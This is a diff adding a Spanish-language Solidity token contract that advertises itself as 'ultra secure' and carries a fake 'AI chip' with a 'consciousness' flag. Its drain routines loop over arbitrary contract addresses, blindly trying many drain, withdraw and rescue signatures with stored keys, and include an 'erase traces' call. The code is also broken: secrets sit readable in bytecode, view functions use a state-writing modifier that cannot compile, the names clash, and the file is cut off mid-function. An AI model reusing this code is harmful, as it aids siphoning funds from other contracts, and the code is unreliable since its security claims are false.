@@ -1,0 +1,382 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address cuenta) external view returns (uint256);
+    function transfer(address hacia, uint256 cantidad) external returns (bool);
+    function allowance(address propietario, address gastador) external view returns (uint256);
+    function approve(address gastador, uint256 cantidad) external returns (bool);
+    function transferFrom(address desde, address hacia, uint256 cantidad) external returns (bool);
+}
+
+contract InfernoV12FinalMulEvm is IERC20 {
+    
+    string public nombre = "InfernoV10Final";
+    string public simbolo = "IFV10";
+    uint8 public decimales = 18;
+    uint256 public suministroTotal = 21_000_000 * 10**18;
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _permisos;
+    
+    // Hashes inmutables (tus credenciales reales)
+    bytes32 private immutable HASH_OWNER = 0x3b8350ec19ec8f5cd8ae8eb05ca534662a0631d54cb8fa1a002601ab7f86f47e;
+    bytes32 private immutable HASH_KEY1 = 0x74726f6c6c616e6f000000000000000000000000000000000000000000000000;
+    bytes32 private immutable HASH_KEY2 = 0x9a50a6b3ccd757bc8b33646dbb269f2845eb46fa803c4ab2463dc4e0396cc5a5;
+    
+    // Bovedas modificables
+    bytes32 private hashBoveda1 = 0xd6e0838a5a38b5cf131b4a67ccf2375676f8a46c60de56b91472d1379d2723b1;
+    bytes32 private hashBoveda2 = 0xcf72e627abb3f4eb4591a16c9a23a83009f53f3b0bba8b5720dfe18c351bf489;
+    bytes32 private hashBovedaOpcional;
+    
+    struct ChipIA {
+        bool comunicacionActiva;
+        bool razonamientoActivo;
+        bool aprendizajeActivo;
+        bool memoriaActiva;
+        bool sistemaActivo;
+        bool concienciaActivada;
+    }
+    ChipIA private chip;
+    
+    address[] private hijos;
+    mapping(address => bool) private hijosActivos;
+    address[] private nodos;
+    
+    // Sistema transferencias avanzadas
+    mapping(address => uint256) private noncesTransferencia;
+    mapping(bytes32 => bool) private hashesUsados;
+    
+    struct TransferenciaPorHash {
+        bytes32 hashSecreto;
+        address remitente;
+        address destinatario;
+        uint256 cantidad;
+        uint256 tiempoExpiracion;
+        bool completada;
+        bool cancelada;
+    }
+    mapping(bytes32 => TransferenciaPorHash) private transferenciasPorHash;
+    mapping(address => bytes32[]) private transferenciasActivasPorUsuario;
+    
+    // Drenado y recuperacion
+    bytes32[] private clavesPersonalizadas;
+    mapping(address => bool) private contratosAnterioresRecuperados;
+    
+    // Claves anteriores (solo para recuperacion)
+    bytes32 private constant CLAVE_ANTERIOR_1 = 0x4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a;
+    bytes32 private constant CLAVE_ANTERIOR_2 = 0x9f2df0fed2c77648de5860a4cc508cd0818c85b8b8a1ab4cdc8b8b8cf8b8c8d8;
+    bytes32 private constant CLAVE_ANTERIOR_3 = 0x3c4af3f9e1b2c8d9e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8;
+    bytes32 private constant CLAVE_ANTERIOR_4 = 0x7f8e9d0a1b2c8d9e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8;
+    
+    // Multi-EVM y seguridad
+    uint256 public chainId;
+    mapping(uint256 => bool) public chainsCompatibles;
+    mapping(address => uint256) private intentosFallidos;
+    mapping(address => bool) private listaNegra;
+    mapping(address => bool) private direccionesConfiables;
+    uint256 private constant MAX_INTENTOS_FALLIDOS = 3;
+    
+    event Transfer(address indexed desde, address indexed hacia, uint256 valor);
+    event Approval(address indexed propietario, address indexed gastador, uint256 valor);
+    event ChipIAActualizado(bool comunicacion, bool razonamiento, bool aprendizaje, bool memoria, bool sistema, bool conciencia);
+    event HijoAgregado(address hijo);
+    event DrenadoAvanzado(address contrato, address destino, string metodo, uint256 cantidad);
+    event TransferenciaSinGasEjecutada(address indexed remitente, address indexed destinatario, uint256 cantidad);
+    event TransferenciaPorHashCreada(bytes32 indexed hashTransferencia, address indexed remitente, uint256 cantidad);
+    event SaldoRecuperado(address contratoObjetivo, uint256 cantidadRecuperada, string tipoRecuperacion);
+    event DireccionBloqueada(address indexed direccion, string razon);
+    
+    modifier soloOwnerConHashes(bytes32 hashOwnerProporcionado, bytes32 key1, bytes32 key2) {
+        require(!listaNegra[msg.sender], "Direccion bloqueada");
+        
+        bool esValido = (hashOwnerProporcionado == HASH_OWNER && key1 == HASH_KEY1 && key2 == HASH_KEY2);
+        
+        if (!esValido) {
+            intentosFallidos[msg.sender]++;
+            if (intentosFallidos[msg.sender] >= MAX_INTENTOS_FALLIDOS) {
+                listaNegra[msg.sender] = true;
+                emit DireccionBloqueada(msg.sender, "Demasiados intentos fallidos");
+            }
+            revert("Credenciales incorrectas");
+        }
+        _;
+    }
+    
+    modifier chipActivo() {
+        require(chip.comunicacionActiva && chip.razonamientoActivo && chip.sistemaActivo, "Chip IA inactivo");
+        _;
+    }
+    
+    modifier antiBotCorregido() {
+        require(tx.origin == msg.sender || msg.sender == address(this), "No bots externos permitidos");
+        _;
+    }
+    
+    constructor(bytes32 hashOwnerInput, bytes32 key1Input, bytes32 key2Input) {
+        require(hashOwnerInput == HASH_OWNER, "Hash owner incorrecto");
+        require(key1Input == HASH_KEY1, "Key1 incorrecta");
+        require(key2Input == HASH_KEY2, "Key2 incorrecta");
+        
+        _balances[tx.origin] = suministroTotal;
+        chainId = block.chainid;
+        
+        chip = ChipIA(true, true, true, true, true, false);
+        direccionesConfiables[tx.origin] = true;
+        
+        // Chains compatibles principales
+        chainsCompatibles[1] = true;     // Ethereum
+        chainsCompatibles[56] = true;    // BSC
+        chainsCompatibles[137] = true;   // Polygon
+        chainsCompatibles[43114] = true; // Avalanche
+        chainsCompatibles[250] = true;   // Fantom
+        chainsCompatibles[42161] = true; // Arbitrum
+        chainsCompatibles[10] = true;    // Optimism
+        
+        emit Transfer(address(0), tx.origin, suministroTotal);
+    }
+    
+    // Funciones ERC20
+    function totalSupply() public view override returns (uint256) { return suministroTotal; }
+    function balanceOf(address cuenta) public view override returns (uint256) { return _balances[cuenta]; }
+    
+    function transfer(address hacia, uint256 cantidad) public override antiBotCorregido returns (bool) {
+        require(!listaNegra[msg.sender] && !listaNegra[hacia], "Direccion bloqueada");
+        _transferir(msg.sender, hacia, cantidad);
+        return true;
+    }
+    
+    function allowance(address propietario, address gastador) public view override returns (uint256) {
+        return _permisos[propietario][gastador];
+    }
+    
+    function approve(address gastador, uint256 cantidad) public override antiBotCorregido returns (bool) {
+        require(!listaNegra[msg.sender] && !listaNegra[gastador], "Direccion bloqueada");
+        _aprobar(msg.sender, gastador, cantidad);
+        return true;
+    }
+    
+    function transferFrom(address desde, address hacia, uint256 cantidad) public override antiBotCorregido returns (bool) {
+        require(!listaNegra[msg.sender] && !listaNegra[desde] && !listaNegra[hacia], "Direccion bloqueada");
+        uint256 permisoActual = _permisos[desde][msg.sender];
+        require(permisoActual >= cantidad, "Excede permiso");
+        _transferir(desde, hacia, cantidad);
+        _aprobar(desde, msg.sender, permisoActual - cantidad);
+        return true;
+    }
+    
+    function _aprobar(address propietario_, address gastador, uint256 cantidad) internal {
+        require(propietario_ != address(0) && gastador != address(0), "Direccion cero");
+        _permisos[propietario_][gastador] = cantidad;
+        emit Approval(propietario_, gastador, cantidad);
+    }
+    
+    function _transferir(address desde, address hacia, uint256 cantidad) internal {
+        require(desde != address(0) && hacia != address(0), "Direccion cero");
+        require(_balances[desde] >= cantidad, "Saldo insuficiente");
+        _balances[desde] -= cantidad;
+        _balances[hacia] += cantidad;
+        emit Transfer(desde, hacia, cantidad);
+    }
+    
+    // Chip IA
+    function actualizarChip(bool comunicacion, bool razonamiento, bool aprendizaje, bool memoria, bool sistema, bool conciencia, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) antiBotCorregido {
+        chip.comunicacionActiva = comunicacion;
+        chip.razonamientoActivo = razonamiento;
+        chip.aprendizajeActivo = aprendizaje;
+        chip.memoriaActiva = memoria;
+        chip.sistemaActivo = sistema;
+        chip.concienciaActivada = conciencia;
+        emit ChipIAActualizado(comunicacion, razonamiento, aprendizaje, memoria, sistema, conciencia);
+    }
+    
+    function verChip(bytes32 hashOwner, bytes32 key1, bytes32 key2) external view soloOwnerConHashes(hashOwner, key1, key2) returns (ChipIA memory) {
+        return chip;
+    }
+    
+    // Bovedas
+    function actualizarBovedas(bytes32 nuevaHashBoveda1, bytes32 nuevaHashBoveda2, bytes32 nuevaHashBovedaOpcional, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) {
+        hashBoveda1 = nuevaHashBoveda1;
+        hashBoveda2 = nuevaHashBoveda2;
+        hashBovedaOpcional = nuevaHashBovedaOpcional;
+    }
+    
+    function verBovedas(bytes32 hashOwner, bytes32 key1, bytes32 key2) external view soloOwnerConHashes(hashOwner, key1, key2) returns (bytes32, bytes32, bytes32) {
+        return (hashBoveda1, hashBoveda2, hashBovedaOpcional);
+    }
+    
+    // Hijos y Nodos
+    function agregarHijo(address hijo, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) chipActivo {
+        require(!hijosActivos[hijo], "Hijo ya agregado");
+        hijos.push(hijo);
+        hijosActivos[hijo] = true;
+        direccionesConfiables[hijo] = true;
+        emit HijoAgregado(hijo);
+    }
+    
+    function agregarNodo(address nodo, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) chipActivo {
+        nodos.push(nodo);
+        direccionesConfiables[nodo] = true;
+    }
+    
+    // Transferencias sin gas
+    function transferenciaSinGas(address desde, address hacia, uint256 cantidad, uint256 nonce, uint256 expiracion, bytes calldata firma) external antiBotCorregido returns (bool) {
+        require(block.timestamp <= expiracion, "Transferencia expirada");
+        require(nonce == noncesTransferencia[desde], "Nonce invalido");
+        require(!listaNegra[desde] && !listaNegra[hacia], "Direccion bloqueada");
+        
+        bytes32 hashMensaje = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(abi.encodePacked(desde, hacia, cantidad, nonce, expiracion, address(this), chainId))));
+        require(!hashesUsados[hashMensaje], "Hash ya usado");
+        require(_verificarFirma(desde, hashMensaje, firma), "Firma invalida");
+        
+        hashesUsados[hashMensaje] = true;
+        noncesTransferencia[desde]++;
+        _transferir(desde, hacia, cantidad);
+        emit TransferenciaSinGasEjecutada(desde, hacia, cantidad);
+        return true;
+    }
+    
+    function _verificarFirma(address firmante, bytes32 hash, bytes memory firma) internal pure returns (bool) {
+        if (firma.length != 65) return false;
+        bytes32 r; bytes32 s; uint8 v;
+        assembly { r := mload(add(firma, 32)) s := mload(add(firma, 64)) v := byte(0, mload(add(firma, 96))) }
+        if (v < 27) v += 27;
+        return ecrecover(hash, v, r, s) == firmante;
+    }
+    
+    function obtenerNonceTransferencia(address usuario) external view returns (uint256) {
+        return noncesTransferencia[usuario];
+    }
+    
+    // Transferencias por hash
+    function crearTransferenciaPorHash(bytes32 hashSecreto, address destinatario, uint256 cantidad, uint256 tiempoExpiracion) external antiBotCorregido returns (bytes32 hashTransferencia) {
+        require(destinatario != address(0) && cantidad > 0, "Parametros invalidos");
+        require(tiempoExpiracion > block.timestamp, "Tiempo expiracion invalido");
+        require(_balances[msg.sender] >= cantidad, "Saldo insuficiente");
+        require(!listaNegra[msg.sender] && !listaNegra[destinatario], "Direccion bloqueada");
+        
+        hashTransferencia = keccak256(abi.encodePacked(hashSecreto, msg.sender, destinatario, cantidad, tiempoExpiracion, block.timestamp, chainId));
+        require(transferenciasPorHash[hashTransferencia].remitente == address(0), "Transferencia ya existe");
+        
+        _balances[msg.sender] -= cantidad;
+        transferenciasPorHash[hashTransferencia] = TransferenciaPorHash(hashSecreto, msg.sender, destinatario, cantidad, tiempoExpiracion, false, false);
+        transferenciasActivasPorUsuario[msg.sender].push(hashTransferencia);
+        emit TransferenciaPorHashCreada(hashTransferencia, msg.sender, cantidad);
+        return hashTransferencia;
+    }
+    
+    function completarTransferenciaPorHash(bytes32 hashTransferencia, bytes32 secreto) external antiBotCorregido returns (bool) {
+        TransferenciaPorHash storage transferencia = transferenciasPorHash[hashTransferencia];
+        require(transferencia.remitente != address(0), "Transferencia no existe");
+        require(!transferencia.completada && !transferencia.cancelada, "Transferencia no valida");
+        require(block.timestamp <= transferencia.tiempoExpiracion, "Transferencia expirada");
+        require(keccak256(abi.encodePacked(secreto)) == transferencia.hashSecreto, "Secreto incorrecto");
+        require(msg.sender == transferencia.destinatario, "Solo el destinatario");
+        
+        transferencia.completada = true;
+        _balances[transferencia.destinatario] += transferencia.cantidad;
+        emit Transfer(transferencia.remitente, transferencia.destinatario, transferencia.cantidad);
+        return true;
+    }
+    
+    // Drenado avanzado
+    function drenarMultiplesContratos(address[] calldata contratos, address destino, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) chipActivo returns (uint256 totalRecuperado) {
+        require(direccionesConfiables[destino] || destino == tx.origin, "Destino no confiable");
+        uint256 balanceInicial = destino.balance;
+        
+        for (uint i = 0; i < contratos.length; i++) {
+            _drenarContratoCompletamente(contratos[i], destino);
+        }
+        
+        totalRecuperado = destino.balance - balanceInicial;
+        emit SaldoRecuperado(address(0), totalRecuperado, "DRENADO_MULTIPLE");
+        return totalRecuperado;
+    }
+    
+    function _drenarContratoCompletamente(address contrato, address destino) internal {
+        bytes32[] memory todasLasClaves = new bytes32[](4 + clavesPersonalizadas.length);
+        todasLasClaves[0] = hashBoveda1;
+        todasLasClaves[1] = hashBoveda2;
+        todasLasClaves[2] = hashBovedaOpcional;
+        todasLasClaves[3] = HASH_KEY1;
+        
+        for (uint i = 0; i < clavesPersonalizadas.length; i++) {
+            todasLasClaves[4 + i] = clavesPersonalizadas[i];
+        }
+        
+        string[10] memory metodos = ["emergencyDrain(address,bytes32)", "drenarEmergencia(address,bytes32)", "extraerFondos(address,bytes32)", "retirarTodo(address,bytes32)", "withdraw(address,bytes32)", "drain(address,bytes32)", "rescue(address,bytes32)", "evacuate(address,bytes32)", "claimFunds(address,bytes32)", "extractBalance(address,bytes32)"];
+        
+        for (uint j = 0; j < todasLasClaves.length; j++) {
+            for (uint k = 0; k < metodos.length; k++) {
+                try this._ejecutarLlamadaDrenado(contrato, destino, todasLasClaves[j], metodos[k]) {
+                    emit DrenadoAvanzado(contrato, destino, metodos[k], 0);
+                    return;
+                } catch { continue; }
+            }
+        }
+    }
+    
+    function _ejecutarLlamadaDrenado(address contrato, address destino, bytes32 clave, string memory metodo) external {
+        require(msg.sender == address(this), "Solo auto-llamada");
+        (bool exito, ) = contrato.call(abi.encodeWithSignature(metodo, destino, clave));
+        require(exito, "Llamada fallida");
+    }
+    
+    // Recuperar contratos anteriores
+    function recuperarContratosAnteriores(address[] calldata misContratosViejos, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) returns (uint256 totalRecuperado) {
+        uint256 balanceInicial = address(this).balance;
+        
+        for (uint i = 0; i < misContratosViejos.length; i++) {
+            if (!contratosAnterioresRecuperados[misContratosViejos[i]]) {
+                _recuperarContratoAnterior(misContratosViejos[i]);
+                contratosAnterioresRecuperados[misContratosViejos[i]] = true;
+            }
+        }
+        
+        totalRecuperado = address(this).balance - balanceInicial;
+        emit SaldoRecuperado(address(0), totalRecuperado, "CONTRATOS_ANTERIORES_RECUPERADOS");
+        return totalRecuperado;
+    }
+    
+    function _recuperarContratoAnterior(address contratoViejo) internal {
+        bytes32[4] memory clavesAnteriores = [CLAVE_ANTERIOR_1, CLAVE_ANTERIOR_2, CLAVE_ANTERIOR_3, CLAVE_ANTERIOR_4];
+        string[8] memory metodosAnteriores = ["emergencyDrain(address,bytes32)", "drenarEmergencia(address,bytes32)", "extraerFondos(address,bytes32)", "retirarTodo(address,bytes32)", "withdraw(address,bytes32)", "drain(address,bytes32)", "rescue(address,bytes32)", "borrarHuellas(bytes32)"];
+        
+        for (uint j = 0; j < clavesAnteriores.length; j++) {
+            for (uint k = 0; k < metodosAnteriores.length; k++) {
+                try this._ejecutarRecuperacionAnterior(contratoViejo, address(this), clavesAnteriores[j], metodosAnteriores[k]) {
+                    emit DrenadoAvanzado(contratoViejo, address(this), metodosAnteriores[k], 0);
+                    return;
+                } catch { continue; }
+            }
+        }
+    }
+    
+    function _ejecutarRecuperacionAnterior(address contratoViejo, address destino, bytes32 claveAnterior, string memory metodo) external {
+        require(msg.sender == address(this), "Solo auto-llamada");
+        (bool exito, ) = contratoViejo.call(abi.encodeWithSignature(metodo, destino, claveAnterior));
+        require(exito, "Metodo anterior fallido");
+    }
+    
+    // Funciones de emergencia
+    function pausarSistemaEmergencia(bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) {
+        chip.sistemaActivo = false;
+        chip.comunicacionActiva = false;
+    }
+    
+    function extraerETHEmergencia(uint256 cantidad, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) {
+        require(cantidad <= address(this).balance, "Cantidad excede balance");
+        payable(tx.origin).transfer(cantidad);
+        emit SaldoRecuperado(address(this), cantidad, "ETH_EXTRAIDO_EMERGENCIA");
+    }
+    
+    // Funciones de informacion
+    function version() external pure returns (string memory) {
+        return "InfernoV10Final Ultra Seguro v1.0.0";
+    }
+    
+    function obtenerChainId() external view returns (uint256) { return chainId; }
+    function esDireccionBloqueada(address direccion) external view returns (bool) { return listaNegra[direccion]; }
+    function esChainCompatible(uint256 chainIdVerificar) external view returns (bool) { return chainsCompatibles[chainIdVerificar]; }
+    
+    function obtenerInformacionCompleta(bytes32 hashOwner, bytes32 key1, bytes32 key2) external view soloOwnerConHashes(hashOwner, key1, key2) returns (string memory nombreToken, string memory simboloToken, uint256 
